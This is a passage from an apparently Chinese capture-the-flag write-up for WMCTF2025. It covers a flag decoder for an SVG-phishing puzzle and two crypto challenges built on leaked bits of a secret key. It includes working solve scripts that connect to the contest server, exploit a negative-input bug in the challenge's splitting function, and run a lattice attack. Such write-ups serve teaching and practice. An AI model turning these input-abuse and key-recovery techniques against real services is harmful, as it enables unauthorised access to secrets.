class="string">&#x27;4p2G&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;4py8&#x27;</span>: <span class="string">&#x27;!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4py7&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py6&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py5&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;4py4&#x27;</span>: <span class="string">&#x27;!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;|&#x27;</span>.join(re.escape(k)</span><br><span class="line">                     <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">sorted</span>(charMap.keys(), key=<span class="keyword">lambda</span> x: -<span class="built_in">len</span>(x))))</span><br><span class="line">stage1Results = []</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]:</span><br><span class="line">    part = polymorphicData[idx]</span><br><span class="line">    decoded = pattern.sub(<span class="keyword">lambda</span> m: charMap[m.group(<span class="number">0</span>)], part)</span><br><span class="line">    stage1Results.append(decoded)</span><br><span class="line"></span><br><span class="line">combined = <span class="string">&#x27;&#x27;</span>.join(stage1Results)</span><br><span class="line"><span class="built_in">print</span>(stage1Results)</span><br><span class="line"><span class="built_in">print</span>(combined)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;wmctwf&#123;SVG_Pchis&#x27;, &#x27;hing_iAtt&#123;aic_k&#x27;, &#x27;_&#123;Dgeitte&#123;cit_i&#x27;, &#x27;o&#123;ng_iEtv&#123;ais_i&#x27;, &#x27;o&#123;ng&#125;i!t!&#123;!i!_!&#x27;]</span></span><br><span class="line"><span class="comment"># wmctwf&#123;SVG_Pchishing_iAtt&#123;aic_k_&#123;Dgeitte&#123;cit_io&#123;ng_iEtv&#123;ais_io&#123;ng&#125;i!t!&#123;!i!_!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wmctf&#123;SVG_Phishing_Attack_Detection_Evasion&#125;</span></span><br><span class="line"><span class="comment"># 翻译过来就是：SVG 嵌入式钓鱼攻击检测</span></span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SplitMaster-14-solved"><a href="#SplitMaster-14-solved" class="headerlink" title="SplitMaster* | 14 solved"></a>SplitMaster* | 14 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_master</span>(<span class="params">B_decimal, segment_bits</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(segment_bits) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits) != <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    n = <span class="built_in">len</span>(segment_bits)</span><br><span class="line">    found_combination = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n,<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line">        <span class="keyword">for</span> indices <span class="keyword">in</span> combinations(<span class="built_in">range</span>(n), k):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices) &gt; <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(indices)):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(indices)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">abs</span>(indices[i] - indices[j]) &lt;= <span class="number">1</span>:</span><br><span class="line">                        valid = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> indices <span class="keyword">and</span> (n-<span class="number">1</span>) <span class="keyword">in</span> indices:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(segment_bits[i]&gt;=<span class="number">25</span> <span class="keyword">for</span> i <span class="keyword">in</span> indices):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            found_combination = indices</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    binary_str = <span class="built_in">bin</span>(B_decimal)[<span class="number">2</span>:].zfill(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_str) &gt; <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"></span><br><span class="line">    segments_binary = []</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bits <span class="keyword">in</span> segment_bits:</span><br><span class="line">        end = start + bits</span><br><span class="line">        segments_binary.append(binary_str[start:end])</span><br><span class="line">        start = end</span><br><span class="line">    </span><br><span class="line">    segments_decimal = [<span class="built_in">int</span>(segment, <span class="number">2</span>) <span class="keyword">for</span> segment <span class="keyword">in</span> segments_binary]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [segments_decimal[i] <span class="keyword">for</span> i <span class="keyword">in</span> found_combination]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置socket超时而不是使用signal.alarm</span></span><br><span class="line">        self.request.settimeout(<span class="number">90</span>)  <span class="comment"># 90秒超时</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span class="string">b&#x27;WMCTF&#123;test&#125;&#x27;</span></span><br><span class="line">            self.send(<span class="string">b&quot;Welcome to WMCTF2025&quot;</span>)</span><br><span class="line">            key = getPrime(<span class="number">512</span>)</span><br><span class="line">            <span class="built_in">print</span>(key)</span><br><span class="line">            q = getPrime(<span class="number">512</span>)</span><br><span class="line">            self.send(<span class="string">b&quot;q:&quot;</span>+<span class="built_in">str</span>(q).encode())</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">                a = getPrime(<span class="number">512</span>)</span><br><span class="line">                b = a * key % q</span><br><span class="line">                gift = split_master(b, <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, self.recv(<span class="string">b&quot;&gt; &quot;</span>).split())))</span><br><span class="line">                self.send(<span class="string">b&quot;a:&quot;</span>+<span class="built_in">str</span>(a).encode())</span><br><span class="line">                self.send(<span class="string">b&quot;gift:&quot;</span>+<span class="built_in">str</span>(gift).encode())</span><br><span class="line">            x = self.recv(<span class="string">b&quot;the key to the flag is: &quot;</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> x == <span class="built_in">str</span>(key):</span><br><span class="line">                self.send(flag)</span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            self.send(<span class="string">b&quot;Time&#x27;s up!&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            self.request.close()  <span class="comment"># 确保连接被关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10003</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HOST:POST &quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(PORT))</span><br><span class="line">    server = ThreadedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p><code>split_master()</code>将一个数进行分割，<strong>进行输出的分段</strong>要求分割序列：</p><ul><li>分段的总比特数不大于30</li><li>单个分段的比特数不大于25</li><li>分段不能相邻</li><li>非首+尾</li></ul><p>$b_{i}\equiv a_{i}*key\pmod p$</p><p>$B_{i}=b_{i,know}$<br>$C_{i}=b_{i,unknown}$</p><p>$a_{i}\cdot key-B_{i}\equiv C_{i}\pmod p$</p><p>$HNP隐藏数问题，已知的是a_{i},p,gift_{i}$<br>$有20轮可以泄露b的一部分信息$</p><p>有点棘手，没解出来……</p><p>诶诶诶，原来有<strong>非预期</strong>吗？我们可以输入<strong>负数</strong>从而获取到更多的位数，比如<code>SU-wp</code>的<code>-3 1 1 513</code>，会得到<strong>高509位</strong>和<strong>低第2位</strong>，这个是最方便且最连续的打法(尝试<code>-2</code>的话，你会发现服务器没有反应)，只需要<strong>爆破未知的两位</strong>即可，可以通过两组数据来进行校验<code>key</code>是否正确</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;62.234.144.69&quot;</span>, <span class="number">30113</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;q:&quot;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = []</span><br><span class="line">gift = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;-3 1 1 513&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;a:&quot;</span>)</span><br><span class="line">    a.append(<span class="built_in">int</span>(io.recvline().strip().decode()))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;gift:&quot;</span>)</span><br><span class="line">    g0, g1 = <span class="built_in">map</span>(<span class="built_in">int</span>, io.recvline().strip()[<span class="number">1</span>: -<span class="number">1</span>].decode().split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">    gift.append([g0, g1])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> binlist <span class="keyword">in</span> product([<span class="number">0</span>, <span class="number">1</span>], repeat=<span class="number">4</span>):</span><br><span class="line">    b0, b1, b2, b3 = binlist</span><br><span class="line">    B0 = (gift[<span class="number">0</span>][<span class="number">0</span>] &lt;&lt; <span class="number">3</span>) + (b0 &lt;&lt; <span class="number">2</span>) + (gift[<span class="number">0</span>][<span class="number">1</span>] &lt;&lt; <span class="number">1</span>) + b1</span><br><span class="line">    B1 = (gift[<span class="number">1</span>][<span class="number">0</span>] &lt;&lt; <span class="number">3</span>) + (b2 &lt;&lt; <span class="number">2</span>) + (gift[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="number">1</span>) + b3</span><br><span class="line">    key1 = B0 * inverse_mod(a[<span class="number">0</span>], q) % q</span><br><span class="line">    key2 = B1 * inverse_mod(a[<span class="number">1</span>], q) % q</span><br><span class="line">    <span class="keyword">if</span> key1 == key2:</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(key1).encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] flag: &quot;</span>, io.recvline().strip().decode())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># WMCTF&#123;Th3_d1ff1culty_Is_up_t0_y0u&#125;</span></span><br></pre></td></tr></table></figure><p><code>N1-wp</code>用的是<code>-257 513 -257 513</code>，会得到<strong>高255位</strong>和<strong>第257至第511位</strong>，未知的是<strong>第256位</strong>和<strong>第512位</strong>，还贴了<code>HNP</code>的<strong>格子</strong>，得偷一波</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;62.234.144.69&quot;</span>, <span class="number">30113</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;q:&quot;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">babai</span>(<span class="params">B, t</span>):</span><br><span class="line">    B = B.LLL()</span><br><span class="line">    G = B.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">    b = t</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(G.nrows())):</span><br><span class="line">        b -= B[i] * ((b * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">    <span class="keyword">return</span> t - b</span><br><span class="line"></span><br><span class="line">m = matrix(ZZ, <span class="number">21</span>, <span class="number">21</span>)</span><br><span class="line">v = vector(ZZ, <span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">W = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m[<span class="number">0</span>, <span class="number">20</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    io.send(<span class="string">b&quot;-257 513 -257 513&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;a:&quot;</span>)</span><br><span class="line">    a = <span class="built_in">int</span>(io.recvline().decode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;gift:&quot;</span>)</span><br><span class="line">    gift = literal_eval(io.recvline().decode())</span><br><span class="line">    m[<span class="number">0</span>, i] = a * W</span><br><span class="line">    m[i + <span class="number">1</span>, i] = q * W</span><br><span class="line">    v[i] = (gift[<span class="number">0</span>] &lt;&lt; <span class="number">257</span>) * W</span><br><span class="line">sol = babai(m, v)</span><br><span class="line"><span class="built_in">print</span>([e.nbits() <span class="keyword">for</span> e <span class="keyword">in</span> sol - v])</span><br><span class="line">sol[-<span class="number">1</span>] = sol[-<span class="number">1</span>] % q</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(sol[-<span class="number">1</span>]).encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] flag: &quot;</span>, io.recvline().strip().decode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>可以参考学习<a href="https://tover.xyz/p/HNP-note/#Level-3">Tover的笔记</a>，没太深入琢磨，应该能打吧……</p><h2 id="IShowSplit-8-solved"><a href="#IShowSplit-8-solved" class="headerlink" title="IShowSplit | 8 solved"></a>IShowSplit | 8 solved</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_master</span>(<span class="params">B_decimal, segment_bits</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(segment_bits) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits) != <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    n = <span class="built_in">len</span>(segment_bits)</span><br><span class="line">    found_combination = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n,<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line">        <span class="keyword">for</span> indices <span class="keyword">in</span> combinations(<span class="built_in">range</span>(n), k):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span>(segment_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices) &gt; <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(indices)):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(indices)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">abs</span>(indices[i] - indices[j]) &lt;= <span class="number">1</span>:</span><br><span class="line">                        valid = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> indices <span class="keyword">and</span> (n-<span class="number">1</span>) <span class="keyword">in</span> indices:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(segment_bits[i]&gt;=<span class="number">25</span> <span class="keyword">for</span> i <span class="keyword">in</span> indices):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            found_combination = indices</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> found_combination <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    binary_str = <span class="built_in">bin</span>(B_decimal)[<span class="number">2</span>:].zfill(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_str) &gt; <span class="number">512</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"></span><br><span class="line">    segments_binary = []</span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bits <span class="keyword">in</span> segment_bits:</span><br><span class="line">        end = start + bits</span><br><span class="line">        segments_binary.append(binary_str[start:end])</span><br><span class="line">        start = end</span><br><span class="line">    </span><br><span class="line">    segments_decimal = [<span class="built_in">int</span>(segment, <span class="number">2</span>) <span class="keyword">for</span> segment <span class="keyword">in</span> segments_binary]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [segments_decimal[i] <span class="keyword">for</span> i <span class="keyword">in</span> found_combination]</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">key=randrange(<span class="number">1</span>,p)</span><br><span class="line">gift=split_master(key,[<span class="number">182</span>,<span class="number">20</span>,<span class="number">200</span>,<span class="number">10</span>,<span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;WMCTF&#123;&quot;</span>+md5(<span class="built_in">str</span>(key).encode()).hexdigest()+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">A=[]</span><br><span class="line">B=[]</span><br><span class="line">R=[]</span><br><span class="line">M=[<span class="number">64</span>, <span class="number">128</span>, <span class="number">256</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    a=randrange(<span class="number">1</span>,p)</span><br><span class="line">    A.append(a)</span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    rr=[]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        r=randrange(<span class="number">1</span>,p)</span><br><span class="line">        k=randrange(<span class="number">1</span>,<span class="number">2</span>^M[j])</span><br><span class="line">        s+=r*k%p</span><br><span class="line">        rr.append(r)</span><br><span class="line">    R.append(rr)</span><br><span class="line">    B.append((a*key+s)%p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;A=<span class="subst">&#123;A&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;B=<span class="subst">&#123;B&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;R=<span class="subst">&#123;R&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;gift=<span class="subst">&#123;gift&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=7159749741429322755131240146118071759513715820993285825839372472474407666017557572129271731613358007058734527689330441569348431807180112353088919340436347</span></span><br><span class="line"><span class="comment"># A=[6099484397780065687822398499925956660167123649401003086450429553387635127108172239381711192830201627868739985455478039493705929385423995630816089813826652, 89722133899180146464100891510163842168405798298452823483063318133678868709451123173510945333104825653032959450315649783796310151123989041792721415722484, 6852373640840439902263069245352036561377612959731529442657261290464193432386684112062098796260781796040393491512167644773780010990517598995340849012156752, 905572447043025859658716967933649489546055535993585428025481014254600350130412634867260097168151503405254514553766823286383565893018173373564554336056693, 4619203611445979770240267215110891760841947947738244443460262136009336416179092898214434705455167036725713675890810610700106198084790551650093160195275702, 3069238570521651083095142261917310941562970802732278543454193591033820858125892411024150728211080137659037098102856608536404922668196774692048992081648551, 2072290141156875572599510174743549619222963372822414855220494223803795956351998912692844952044029330311821434784805742487737048376693843981146845532811418, 4118630348835299974900731058046317343585580076694977535798202938226187304960635726712385771299418425062431822315135332845240129948946520330840063372710812, 5494897767679702083905262716715474988716617413297387287978901109122932238365802120197755794026314539468927208231771384572456104728695543349076171476106692, 5242904898120293050194404817363504806316489104114848367489798169501727630568797399722291273601688449269113866312614390323808528035310223034076071688527093]</span></span><br><span class="line"><span class="comment"># B=[2225881589521184173065274225912017053067069649965432632423136697355986574624766674385247816885344883664964124555071710934403200036986056742665338710501199, 6648320309177586281256682217887823816445310746588184022611740437856487828841524257412678979289757558617628247133981523476180196883192489542467687175493866, 1368643343865975119970439821808519233195197253476459608302319415282308653927922072355125801570423137124789823080768464141261145798676583005521122600184021, 4757972435898893943050634851470164873875968802674701938325764517462502213399385660925464222079964582272246709905040569303916540860368398046797311634207119, 3491493600654315810383896038657359020801782746573223354229968950004336723011925225140197224620617196713846979463196337854602425927920594332253840267066287, 5812910599586334226756848369194045700041602130860303332014243049211324518168755764068940745746358136899818045819591702608213306673108319488577075164061902, 5286480909173195769260613883921498519696474112632193807758953252056528658290642833837928174403014629586637399671995087032742056865191425515352773317139947, 5990084243427240363832897819696345106790895509165460228212982648304258173654753003702718799678678397988011691031933597893892134441380835867546094903910961, 4657207884013678545225122398830559190905549085156416548267023047411835416409008088567237198440378272503925106822333599825940007094045484876222921444207859, 4337342732185682149995046884384392099143035562597116814453255157188836395606408153375003404584342070812600880379801960599561396105172991519802949392096959]</span></span><br><span class="line"><span class="comment"># R=[[5437342344417526961447037102420381576182242917002824736531383988448576795401348337669838142255293777506485879415403692176729738237621696959342977281065396, 118207420592466754679295752653401966487038067694232692642557897325071960359432451312279399266748403346434433562012104799520263992802423378954266828804131, 7096197247368703535624516822532525663824053041765748785834200261711792994365801659587654582314309510718479268191354720373426303224114439156530646421389487], [2048337393654342724878996996835462937898615364747266814141518152181142819685131064444737246705773125581643549980403948577060721913752092536246991248488798, 4032915799560554709639638304258383923016302450145031749214368211030759499850002173909365184297695024196808815382820437454460747458506629192382539028901160, 4232871593307892145191764881832084004817150942430800176840205014538991625057835110518374643680800074286367340775128361231313202429848296012489919924979266], [2553386960937591100090865827289064489951927968995578370310341693487902315425241611375327831218812187817696136311487587016400127802098102736127873401818913, 5823670592022005462447151598758745521401539301567430301030393638437006554138239970651467866637510447017480176716140423825242961163243963505222273874838613, 5774084025457416187346689800934856256827564486310334723289121828349816917057440353481035763960569668502226684658505097070668779989218703360744064625684871], [7046572309712543369992700561219588655579833588142366002445356785295649361641707579997338719645976088701747288198545152391667165237528203051491380206476100, 3086411743880543388057778894558929465483005347509988210044202022882123069984407733408405454699097438747656268706316626496116194702187510362704226701362680, 3824920704333716278162115284149190730865231866245771161577917822721893196275454552093227654236325852790896150665403865418453038676291626669950621607864235], [6760618245898750953819376194151632666239738960636983938459565687242233704064651489179662554150497876748082273757875418325340597777457003363001123655534527, 4343397856990866281857795612386217816895468511981051731094731266904611655944226707430233814074001565540730803579725372227013575628572646210241319814714476, 7126011694277861782468567565693664008866580617261568379233477615778205440306291716911745585348838954153812439519950532595352182974188212855768277246923419], [2953923187831173071776186551032070259914505167253362070557203382982396081492190509064486405525934004929672640497574202986456906310807830423216504796476927, 1345669062441589204474792668690191778211085836386374497142860395037294956095491918997725669029150439803057766748915079527876461488078624845798404978671362, 6975771805724338057550497476188442963101655123133481610941634405619501180059972427132933469246923537067484663454770321483398210207386857564548399452193784], [613595431074082703746546668753146025816666490902587228756275516028887275638378432031652661608234989583525385999489844534573227312653028029927921272453512, 4123105910746992373978630252040464408125059102592223292674058753777019714209155710896007043366563874898777820917476610249503568925138753611543704471760303, 989555937865263901715230959831678853496396994080634488540356871394920097958240471950255879798889334377502384605373832255522749450694078070958912976709214], [5535837862012327812765107969360670846116191751375838521859633639946929019321243840486291205554534270213183060274542457089991919161794065714297577071253492, 2217022003356883793255174224244083193207752640022692463419248286782028965975927441224003452590436406144452759467937867082143500151445862797223973537424326, 4169012965258555766659454909927125486691566973583123755296718808398491419295598806865374588756721952326039465076613735671092746736038930739233766233317746], [2460973952017922432127354291027776825014962112677929880673566789249322210046943034298740329681812324994822480424953136978723367413424675867422535483400994, 